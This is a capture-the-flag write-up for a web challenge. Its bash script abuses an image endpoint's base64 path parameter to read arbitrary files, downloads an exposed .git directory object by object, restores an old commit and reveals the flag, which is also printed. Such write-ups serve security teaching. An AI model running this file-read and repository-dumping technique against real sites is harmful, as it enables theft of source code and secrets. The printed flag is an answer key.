#### Challenge:

Shrek seems to be pretty angry about something, so he deleted some important information off his site. He murmured something about Donkey being too _committed_ to infiltrate his swamp. Can you _checkout_ the site and see what the _status_ is? [link](http://3.91.17.218/)

---

#### Solution:

```bash
function download() {
    mkdir -p ${1%/*}
    curl http://3.91.17.218/getimg.php?img=$(echo -n "$1" | base64) 2>/dev/null > $1
}

download .git/HEAD
download .git/refs/heads/master
download .git/logs/HEAD

for h in `cat .git/logs/HEAD | awk '{print substr($2,0,2) "/" substr($2,3,length($2))}'`; do
    download .git/objects/$h
done

while ! git fsck --full 1>2 2>/dev/null ; do
    for h in `git fsck --full | grep missing | awk '{print substr($3,0,2) "/" substr($3,3,length($3))}'`; do
        download .git/objects/$h
    done
done

git log
git checkout 759be945739b04b63a09e7c02d51567501ead033
cat ./index.php | grep utflag
```

---

<details><summary>FLAG:</summary>

```
utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}
```

</details>
<br/>
